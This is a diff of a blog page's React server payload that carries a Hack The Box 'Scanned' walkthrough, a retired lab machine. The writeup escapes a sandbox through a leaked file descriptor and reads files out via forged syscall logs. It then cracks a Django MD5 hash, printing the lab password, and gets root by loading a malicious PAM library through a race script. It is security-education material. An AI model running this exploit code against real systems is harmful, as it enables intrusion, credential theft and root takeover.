@@ -1,14 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-b:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-d:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-f:I[484,[],"OutletBoundary"]
-10:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Scanned Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Two sandbox flaws exposed a host directory through another process's open file descriptor, letting forged syscall logs leak Django credentials for Clarence, then a jail race loaded a malicious PAM library through setuid su and created a root shell."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:41:28.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[16," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-scanned-walkthrough.webp","width":800,"height":800,"alt":"Hack The Box Scanned machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Scanned machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/scanned","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":["$L5","$L6"]}]]}],null,"$L7"]}],"$L8","$L9"],null,"$La"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","aside",null,{"className":"article-context","aria-label":"Article context","children":[["$","$Lb",null,{"headings":[{"id":"overview-what-are-we-facing","label":"Overview: What Are We Facing?"},{"id":"phase-1-enumeration-and-reconnaissance","label":"Phase 1: Enumeration & Reconnaissance"},{"id":"phase-2-source-code-analysis","label":"Phase 2: Source code analysis"},{"id":"phase-3-understanding-the-vulnerabilities","label":"Phase 3: Understanding the Vulnerabilities"},{"id":"phase-4-foothold-escaping-the-sandbox","label":"Phase 4: Foothold - Escaping the Sandbox"},{"id":"phase-5-user-flag-credential-extraction-and-cracking","label":"Phase 5: User Flag - Credential Extraction & Cracking"},{"id":"phase-6-privilege-escalation-abusing-the-sandbox-again","label":"Phase 6: Privilege Escalation - Abusing the Sandbox Again"},{"id":"phase-7-root-flag","label":"Phase 7: Root Flag"},{"id":"key-lessons","label":"Key lessons"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/7b14cc752de075720f6714d0c7658124b4796198/HTB-Scanned.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 7b14cc752de0",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Scanned, Linux, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/scanned","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}]
-c:T7302,<p><strong>Target:</strong> <code>10.129.11.112</code><br><strong>Attacker:</strong> <code>10.10.16.84</code> (Kali)<br><strong>Machine:</strong> Scanned (Insane Linux)<br><strong>Flags Captured:</strong></p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Scanned Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Two sandbox flaws exposed a host directory through another process's open file descriptor, letting forged syscall logs leak Django credentials for Clarence, then a jail race loaded a malicious PAM library through setuid su and created a root shell."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Scanned"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/scanned","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Insane"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-scanned-walkthrough.webp","width":800,"height":800,"alt":"Hack The Box Scanned machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Scanned machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/scanned","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T7984,<p><strong>Target:</strong> <code>10.129.11.112</code><br><strong>Attacker:</strong> <code>10.10.16.84</code> (Kali)<br><strong>Machine:</strong> Scanned (Insane Linux)<br><strong>Flags Captured:</strong></p>
 <ul>
 <li>User: <code>0ce7fc[redacted]5d9ccfeb9f</code></li>
 <li>Root: <code>1bceaec[redacted]3492b92f804</code></li>
@@ -24,7 +30,7 @@ c:T7302,<p><strong>Target:</strong> <code>10.129.11.112</code><br><strong>Attack
 <hr>
 <h2 id="phase-1-enumeration-and-reconnaissance">Phase 1: Enumeration &amp; Reconnaissance</h2>
 <h3 id="step-1-1-port-scanning">Step 1.1: Port Scanning</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.11.112
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.11.112
 nmap -p 22,80 -sCV 10.129.11.112
 </code></pre>
 <p><strong>Results:</strong></p>
@@ -43,7 +49,7 @@ nmap -p 22,80 -sCV 10.129.11.112
 </ul>
 <p> The developer gave us the source code. This is not a bug - it's a feature they advertise ("open source"). But from an attacker's perspective, source code is a useful source. Instead of blindly fuzzing or guessing endpoints, we can perform <strong>white-box analysis</strong>.</p>
 <h3 id="step-1-3-download-and-extract-the-source">Step 1.3: Download and Extract the Source</h3>
-<pre><code class="language-bash" data-language="bash">curl -o source.tar.gz http://10.129.11.112/static/source.tar.gz
+<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">curl -o source.tar.gz http://10.129.11.112/static/source.tar.gz
 tar xzf source.tar.gz
 </code></pre>
 <p>Two folders appear:</p>
@@ -62,7 +68,7 @@ tar xzf source.tar.gz
 <li><code>/admin/</code> : Django admin panel</li>
 </ul>
 <p><strong>Key file:</strong> <code>malscanner/scanner/views.py</code></p>
-<pre><code class="language-python" data-language="python">def handle_file(file):
+<pre tabindex="0" aria-label="python code or terminal block 3"><code class="language-python" data-language="python">def handle_file(file):
     md5 = calculate_file_md5(file)
     path = f"{settings.FILE_PATH}/{md5}"
     with open(path, 'wb+') as f:
@@ -106,7 +112,7 @@ tar xzf source.tar.gz
 <p>Here, the sandbox uses <code>chroot</code>, <code>ptrace</code>, namespaces, and a killer process. It looks solid... but we can look closer.</p>
 <h3 id="step-2-3-finding-the-first-bug-prctl-pr-set-dumpable-1-before-fork">Step 2.3: Finding the First Bug: <code>prctl(PR_SET_DUMPABLE, 1)</code> Before Fork</h3>
 <p>In <code>tracing.c</code>, the <code>do_trace()</code> function:</p>
-<pre><code class="language-c" data-language="c">void do_trace() {
+<pre tabindex="0" aria-label="c code or terminal block 4"><code class="language-c" data-language="c">void do_trace() {
     // We started with capabilities - we must reset the dumpable flag
     // so that the child can be traced
     prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);
@@ -126,7 +132,7 @@ tar xzf source.tar.gz
 <p> Developers often add security controls, but timing matters. A control applied at the wrong point in the execution flow can be meaningless or even counterproductive. ask: <em>"When is this control applied, and what exists before/after it?"</em></p>
 <h3 id="step-2-4-finding-the-second-bug-the-open-file-descriptor">Step 2.4: Finding the Second Bug: The Open File Descriptor</h3>
 <p>In <code>sandbox.c</code>:</p>
-<pre><code class="language-c" data-language="c">int jailsfd = -1;
+<pre tabindex="0" aria-label="c code or terminal block 5"><code class="language-c" data-language="c">int jailsfd = -1;
 
 void make_jail(char* name, char* program) {
     jailsfd = open("jails", O_RDONLY|__O_DIRECTORY);
@@ -142,7 +148,7 @@ void make_jail(char* name, char* program) {
 }
 </code></pre>
 <p>In <code>tracing.c</code>:</p>
-<pre><code class="language-c" data-language="c">void do_child() {
+<pre tabindex="0" aria-label="c code or terminal block 6"><code class="language-c" data-language="c">void do_child() {
     // Prevent child process from escaping chroot
     close(jailsfd);  // &lt;-- Only closed in the CHILD!
     prctl(PR_SET_PDEATHSIG, SIGHUP);
@@ -177,7 +183,7 @@ void make_jail(char* name, char* program) {
 <h2 id="phase-4-foothold-escaping-the-sandbox">Phase 4: Foothold - Escaping the Sandbox</h2>
 <h3 id="step-4-1-understanding-the-log-format">Step 4.1: Understanding the Log Format</h3>
 <p>The sandbox logs syscalls to <code>/log</code> inside the jail. Each log entry is exactly <strong>64 bytes</strong> (8 × 8-byte values):</p>
-<pre><code class="language-c" data-language="c">typedef struct __attribute__((__packed__)) {
+<pre tabindex="0" aria-label="c code or terminal block 7"><code class="language-c" data-language="c">typedef struct __attribute__((__packed__)) {
     unsigned long rax;   // syscall number
     unsigned long rdi;
     unsigned long rsi;
@@ -204,7 +210,7 @@ void make_jail(char* name, char* program) {
 <p> You're trapped in a box with no network. But the box has a <strong>window</strong> - the log file that gets displayed on a webpage. If you can control what's written to the log, you can send messages through that window. This is a <strong>covert channel</strong> attack.</p>
 <h3 id="step-4-2-writing-the-file-read-exploit">Step 4.2: Writing the File-Read Exploit</h3>
 <p>We create <code>read_file.c</code>:</p>
-<pre><code class="language-c" data-language="c">#include &lt;stdio.h&gt;
+<pre tabindex="0" aria-label="c code or terminal block 8"><code class="language-c" data-language="c">#include &lt;stdio.h&gt;
 
 int main() {
     size_t bytesRead = 0;
@@ -225,16 +231,16 @@ int main() {
 }
 </code></pre>
 <p><strong>Why static compilation?</strong> The jail only copies <code>libc.so.6</code> and the dynamic linker. Our Kali machine is ARM64, but the target is x86_64. If we cross-compile dynamically, the binary might link against a different glibc version and fail to run. Static linking bundles everything:</p>
-<pre><code class="language-bash" data-language="bash">x86_64-linux-gnu-gcc -static -o read_file read_file.c
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">x86_64-linux-gnu-gcc -static -o read_file read_file.c
 </code></pre>
 <p> Minimize dependencies when exploiting constrained environments. A dynamically linked binary might fail if the target's libraries don't match exactly. A statically linked binary is self-contained and more reliable.</p>
 <h3 id="step-4-3-uploading-the-exploit">Step 4.3: Uploading the Exploit</h3>
-<pre><code class="language-bash" data-language="bash">curl -F "file=@read_file" http://10.129.11.112/scanner/upload/
+<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">curl -F "file=@read_file" http://10.129.11.112/scanner/upload/
 </code></pre>
 <p>The server responds with a redirect to <code>/viewer/&lt;md5hash&gt;/</code>.</p>
 <h3 id="step-4-4-decoding-the-exfiltrated-data">Step 4.4: Decoding the Exfiltrated Data</h3>
 <p>We write <code>decode.py</code>:</p>
-<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
+<pre tabindex="0" aria-label="python code or terminal block 11"><code class="language-python" data-language="python">#!/usr/bin/env python3
 import re, requests, struct, sys
 
 if len(sys.argv) &lt; 3:
@@ -258,7 +264,7 @@ with open(sys.argv[2], "wb") as f:
 print(f"[+] Wrote {len(res_file)} bytes to {sys.argv[2]}")
 </code></pre>
 <p>Run it:</p>
-<pre><code class="language-bash" data-language="bash">python3 decode.py http://10.129.11.112/viewer/&lt;hash&gt;/ malscanner.db
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">python3 decode.py http://10.129.11.112/viewer/&lt;hash&gt;/ malscanner.db
 file malscanner.db
 # Output: SQLite 3.x database
 </code></pre>
@@ -267,15 +273,15 @@ file malscanner.db
 <h2 id="phase-5-user-flag-credential-extraction-and-cracking">Phase 5: User Flag - Credential Extraction &amp; Cracking</h2>
 <h3 id="step-5-1-extracting-the-hash-from-the-database">Step 5.1: Extracting the Hash from the Database</h3>
 <p>The SQLite database appears malformed when opened with <code>sqlite3</code> (likely because we captured some extra bytes at the end or beginning), but <code>strings</code> reveals the data:</p>
-<pre><code class="language-bash" data-language="bash">strings malscanner.db | grep "md5\$"
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">strings malscanner.db | grep "md5\$"
 </code></pre>
 <p>Output:</p>
-<pre><code>md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074clarence2021-09-14 18:36:46.227819
+<pre tabindex="0" aria-label="Code or terminal block 14"><code>md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074clarence2021-09-14 18:36:46.227819
 </code></pre>
 <p> When a database is corrupt or you don't know the schema, <code>strings</code> is your best friend. It extracts all printable text. Password hashes, usernames, and secrets often appear in plaintext within binary files.</p>
 <h3 id="step-5-2-understanding-the-hash-format">Step 5.2: Understanding the Hash Format</h3>
 <p>From the Django source (<code>settings.py</code>), we saw:</p>
-<pre><code class="language-python" data-language="python">PASSWORD_HASHERS = [
+<pre tabindex="0" aria-label="python code or terminal block 15"><code class="language-python" data-language="python">PASSWORD_HASHERS = [
     "django.contrib.auth.hashers.MD5PasswordHasher"
 ]
 </code></pre>
@@ -288,16 +294,16 @@ file malscanner.db
 <p>Django's MD5 hasher computes: <code>MD5(salt + password)</code></p>
 <p><strong>Hashcat mode 20</strong> is exactly <code>md5($salt.$pass)</code>. Hashcat expects the format: <code>hash:salt</code></p>
 <h3 id="step-5-3-cracking-the-password">Step 5.3: Cracking the Password</h3>
-<pre><code class="language-bash" data-language="bash">echo 'REDACTED_HASH_OR_FLAG:kL2cLcK2yhbp3za4w3752m' &gt; hash.txt
+<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">echo 'REDACTED_HASH_OR_FLAG:kL2cLcK2yhbp3za4w3752m' &gt; hash.txt
 hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt --force
 </code></pre>
 <p>Result:</p>
-<pre><code>REDACTED_HASH_OR_FLAG:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecrying
+<pre tabindex="0" aria-label="Code or terminal block 17"><code>REDACTED_HASH_OR_FLAG:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecrying
 </code></pre>
 <p><strong>Credentials:</strong> <code>clarence:onedayyoufeellikecrying</code></p>
 <p> Check the source code for configuration details. The <code>settings.py</code> told us the exact hashing algorithm. Without that, we might waste time guessing hash types. Knowledge of the application's internals makes credential attacks much faster.</p>
 <h3 id="step-5-4-ssh-access-and-user-flag">Step 5.4: SSH Access and User Flag</h3>
-<pre><code class="language-bash" data-language="bash">ssh clarence@10.129.11.112
+<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">ssh clarence@10.129.11.112
 # Password: REDACTED
 cat ~/user.txt
 </code></pre>
@@ -312,10 +318,10 @@ cat ~/user.txt
 <li>The only unusual thing is the <strong>sandbox binary itself</strong></li>
 </ul>
 <p>Check the sandbox capabilities:</p>
-<pre><code class="language-bash" data-language="bash">/usr/sbin/getcap /var/www/malscanner/sandbox/sandbox
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">/usr/sbin/getcap /var/www/malscanner/sandbox/sandbox
 </code></pre>
 <p>Output:</p>
-<pre><code>sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eip
+<pre tabindex="0" aria-label="Code or terminal block 20"><code>sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eip
 </code></pre>
 <p> When <code>sudo -l</code> gives you nothing and <code>linpeas</code> finds nothing, look at what makes this box unique. The <strong>sandbox</strong> is the single most privileged binary on the system. It's not SUID, but it has <strong>capabilities</strong> - fine-grained root privileges. If you can make the sandbox do something malicious, you get those privileges.</p>
 <h3 id="step-6-2-understanding-the-root-exploit-strategy">Step 6.2: Understanding the Root Exploit Strategy</h3>
@@ -334,7 +340,7 @@ cat ~/user.txt
 <p>We choose <code>/usr/bin/su</code> as our SetUID target. It depends on <code>libpam_misc.so.0</code>, which is small. We only need to provide one function (<code>misc_conv</code>) to satisfy its symbol requirements.</p>
 <h3 id="step-6-4-writing-the-exploit-files">Step 6.4: Writing the Exploit Files</h3>
 <p><strong><code>runsu.c</code></strong> - The sleeper binary:</p>
-<pre><code class="language-c" data-language="c">#include &lt;stdio.h&gt;
+<pre tabindex="0" aria-label="c code or terminal block 21"><code class="language-c" data-language="c">#include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 
 int main() {
@@ -350,7 +356,7 @@ int main() {
 }
 </code></pre>
 <p><strong><code>setuidlib.c</code></strong> - The malicious library:</p>
-<pre><code class="language-c" data-language="c">#include &lt;stdlib.h&gt;
+<pre tabindex="0" aria-label="c code or terminal block 22"><code class="language-c" data-language="c">#include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;sys/stat.h&gt;
 
@@ -370,10 +376,10 @@ static __attribute__((constructor)) void init(void) {
 <p><strong>Why <code>/proc/1/fd/3/</code> in the constructor?</strong> Even though <code>su</code> is running inside the chroot, the constructor executes before <code>su</code>'s main code. We still need to escape the jail to modify <code>/tmp/0xdf</code> on the real filesystem. The same fd escape works here.</p>
 <h3 id="step-6-5-setting-up-on-the-target">Step 6.5: Setting Up on the Target</h3>
 <p>Copy bash to <code>/tmp/0xdf</code> (this becomes our future root shell):</p>
-<pre><code class="language-bash" data-language="bash">cp /bin/bash /tmp/0xdf
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">cp /bin/bash /tmp/0xdf
 </code></pre>
 <p>Compile the exploit files on the target:</p>
-<pre><code class="language-bash" data-language="bash">gcc -o runsu runsu.c
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">gcc -o runsu runsu.c
 gcc -shared -fPIC -o setuidlib.so setuidlib.c
 </code></pre>
 <h3 id="step-6-6-the-race-condition-exploit">Step 6.6: The Race Condition Exploit</h3>
@@ -385,7 +391,7 @@ gcc -shared -fPIC -o setuidlib.so setuidlib.c
 <li><strong>Overwrites</strong> <code>libpam_misc.so.0</code> with our malicious library</li>
 <li>Waits for the sandbox to finish</li>
 </ol>
-<pre><code class="language-bash" data-language="bash">#!/bin/bash
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">#!/bin/bash
 cd /var/www/malscanner/sandbox
 rm -rf jails/a 2&gt;/dev/null
 
@@ -408,24 +414,24 @@ wait $pid
 <p> This is a <strong>Time-of-Check to Time-of-Use (TOCTOU)</strong> race condition. The sandbox checks that libraries are safe at compile time (they come from the host), but at runtime, we can modify the jail contents between when the jail is created and when the binary executes. Races are everywhere in systems programming.</p>
 <h3 id="step-6-7-execution-and-result">Step 6.7: Execution and Result</h3>
 <p>Run the script:</p>
-<pre><code class="language-bash" data-language="bash">bash /home/clarence/exploit.sh
+<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">bash /home/clarence/exploit.sh
 </code></pre>
 <p>After ~10 seconds, check <code>/tmp/0xdf</code>:</p>
-<pre><code class="language-bash" data-language="bash">ls -la /tmp/0xdf
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">ls -la /tmp/0xdf
 </code></pre>
 <p>Output:</p>
-<pre><code>-rwsrwxrwx 1 root root 1234376 ... /tmp/0xdf
